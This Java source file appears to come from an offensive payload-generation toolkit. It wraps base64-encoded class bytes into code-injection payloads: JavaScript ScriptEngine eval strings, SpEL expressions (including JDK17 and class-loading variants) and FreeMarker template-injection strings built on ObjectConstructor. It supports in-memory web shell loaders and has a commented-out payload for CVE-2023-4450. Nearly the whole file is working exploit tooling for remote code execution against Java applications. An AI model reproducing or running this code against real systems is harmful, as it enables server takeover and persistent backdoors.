package com.ppp;

import com.ppp.annotation.JavaClassEnhance;
import com.ppp.annotation.JavaClassHelperType;
import com.ppp.annotation.JavaClassMakerEnhance;
import com.ppp.utils.PayloadUtils;
import com.ppp.utils.maker.CryptoUtils;

import java.util.HashMap;

/**
 * @author Whoopsunix
 */
public class JavaClassAdvanceBuilder {
    public static HashMap<String, Object> results = new HashMap<String, Object>() {{
        put(JavaClassEnhance.Script.getInfo(), null);
        put(JavaClassEnhance.SPEL.getInfo(), null);
        put(JavaClassMakerEnhance.JDK17.getInfo(), null);
        put(JavaClassEnhance.SPELLoadClass.getInfo(), null);
    }};

    public static void builder(JavaClassHelper javaClassHelper) throws Exception {
        /**
         * 创建增强
         */
        JavaClassMakerEnhance[] javaClassMakerEnhances = javaClassHelper.getJavaClassMakerEnhances();
        for (JavaClassMakerEnhance javaClassMakerEnhance : javaClassMakerEnhances) {
            switch (javaClassMakerEnhance) {
                case JDK17:
                    results.put(JavaClassMakerEnhance.JDK17.getInfo(), true);
                    javaClassHelper.setJavaClassPackageName("org.springframework.expression");
                    break;
            }
        }
    }

    /**
     * 增强
     */
    public static void result(JavaClassHelper javaClassHelper, byte[] bytes) throws Exception {
        JavaClassEnhance[] javaClassEnhances = javaClassHelper.getJavaClassEnhances();
        String className = null;
        // 内存马
        if (javaClassHelper.getJavaClassHelperType().equals(JavaClassHelperType.MemShell)) {
            className = javaClassHelper.getLoaderClassName();
        } else {
            className = javaClassHelper.getCLASSNAME();
        }


        String freeMakerPayload = null;
        for (JavaClassEnhance javaClassEnhance : javaClassEnhances) {
            switch (javaClassEnhance) {
                case Default:
                default:
                    break;
                case Script:
                    String code = PayloadUtils.script(CryptoUtils.base64encoder(bytes), className);
                    results.put(JavaClassEnhance.Script.getInfo(), code);
                    Printer.title(JavaClassEnhance.Script.getInfo());
                    Printer.result(code);
                case SPEL:
                    String spel = PayloadUtils.spel(CryptoUtils.base64encoder(bytes), className);
                    results.put(JavaClassEnhance.SPEL.getInfo(), spel);
                    Printer.title(JavaClassEnhance.SPEL.getInfo());
                    Printer.result(spel);

                    if (results.get(JavaClassMakerEnhance.JDK17.getInfo()) != null) {
                        String spelJDK17 = PayloadUtils.spelJDK17(CryptoUtils.base64encoder(bytes), className);
                        results.put(JavaClassMakerEnhance.JDK17.getInfo(), spelJDK17);
                        Printer.title(JavaClassMakerEnhance.JDK17.getInfo());
                        Printer.result(spelJDK17);
                    }

                    String spelLoadClass = PayloadUtils.spelLoadClass(className);
                    results.put(JavaClassEnhance.SPELLoadClass.getInfo(), spelLoadClass);
                    Printer.title(JavaClassEnhance.SPELLoadClass.getInfo());
                    Printer.result(spelLoadClass);


                    break;
                case FreeMarker:
                    freeMarkerBuilder();

//                    if (spel2 != null) {
//                        Printer.title("SPEL java.util.Base64");
//                        freeMakerPayload = String.format("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"%s\").getValue()}", spel2);
//                        Printer.result(freeMakerPayload);
//                    }


                    // CVE-2023-4450
//                String codec = PayloadUtils.script(CryptoUtils.base64encoder(bytes), className).replaceAll("\"", "\\\\\"");
//                String freeMakerPayload = String.format("{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval('%s#{1};')}\",\"dbSource\":\"\",\"type\":\"0\"}", codec);

//                Printer.print(freeMakerPayload);
            }
        }


    }

    public static void freeMarkerBuilder() {
        Printer.title(JavaClassEnhance.FreeMarker.getInfo());
        for (String key : results.keySet()) {
            if (results.get(key) == null) {
                continue;
            }

            Printer.title(key);
            if (key.equals(JavaClassMakerEnhance.JDK17.getInfo()) || key.equals(JavaClassEnhance.SPEL.getInfo()) || key.equals(JavaClassEnhance.SPELLoadClass.getInfo())) {
                String freeMakerPayload = String.format("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"%s\").getValue()}", results.get(key));
                Printer.result(freeMakerPayload);
            }

            if (key.equals(JavaClassEnhance.Script.getInfo())) {
                String freeMakerPayload = String.format("{\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval('%s')}", results.get(key));
                Printer.result(freeMakerPayload);
            }
        }
    }
}
